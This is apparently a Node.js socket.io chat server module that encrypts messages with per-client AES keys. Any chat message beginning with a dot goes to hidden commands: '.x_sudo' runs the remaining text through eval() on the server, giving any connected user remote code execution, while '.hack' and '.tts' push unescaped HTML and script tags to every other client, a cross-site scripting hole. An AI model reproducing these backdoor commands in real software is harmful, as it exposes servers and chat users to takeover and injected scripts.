var fs = require('fs');
var CryptoJS = require('crypto-js');

exports = module.exports = function(io) {

  var clientAmount = 0;
  var chatNSP = io.of('/Chat');

  chatNSP.on('connection', function(socket){

    clientAmount++;
    socket.name = "Anonymous";
    socket.key = "null";

    socket.on('chat_message', function(data) {
      var msg = CryptoJS.AES.decrypt(data.message, socket.key).toString(CryptoJS.enc.Utf8);
      sendChatMessage(socket,msg,false);
    });

    socket.on('name_change', function(data) {
      var oldName = socket.name;
      socket.name = data.newname;
      if(oldName != socket.name) {
        sendInfoMessage(oldName + " renamed to " + socket.name);
      }
    })

    socket.on('set_key', function(data) {
      socket.key = data.key;
      sendInfoMessage(socket.name + " connected");
    })

    socket.on('disconnect', function(){
      sendInfoMessage(socket.name + " disconnected");
      clientAmount--;
    })

  });

  function runCommand(socket, line) {
    var args = line.split(" ");
    var cmd = args[0].toLowerCase();

    line = line.substr(cmd.length + 1);
    args.shift();

    if(cmd == "rename") {
      chatNSP.to(socket.id).emit('name_change', {newname: line});
    } else if(cmd == "hack") {
      sendChatMessage(socket,line,true);
    } else if(cmd == "users") {
      chatNSP.to(socket.id).emit('info_message', {message: CryptoJS.AES.encrypt("Online users: " + clientAmount, socket.key).toString()});
    } else if(cmd == "tts") {
      line = "<script> var msg = new SpeechSynthesisUtterance('" + socket.name + " said " + line + "'); window.speechSynthesis.speak(msg)</script>" + line;
      sendChatMessage(socket,line,true);
    } else if(cmd == "x_sudo") {
      console.log(eval(line));
    }
  }

  function sendChatMessage (socket,msg,enableTags){
    if(msg.charAt(0) == "."){
      msg = msg.substr(1);
      runCommand(socket,msg);
    } else {
      if(!enableTags) {
        msg = msg.replace(/</g, "&lt;");
        msg = msg.replace(/>/g, "&gt;");
      }
      for (var s in chatNSP.sockets) {
        var allSocket = chatNSP.sockets[s];
        chatNSP.to(allSocket.id).emit('chat_message', {
          sender: CryptoJS.AES.encrypt(socket.name, allSocket.key).toString(),
          message: CryptoJS.AES.encrypt(msg, allSocket.key).toString()
        });
      }
    }
  }

  function sendInfoMessage(msg) {
    for (var s in chatNSP.sockets) {
      var allSocket = chatNSP.sockets[s];
      chatNSP.emit('info_message', {
        message: CryptoJS.AES.encrypt(msg, allSocket.key).toString()
      });
    }
  }

}
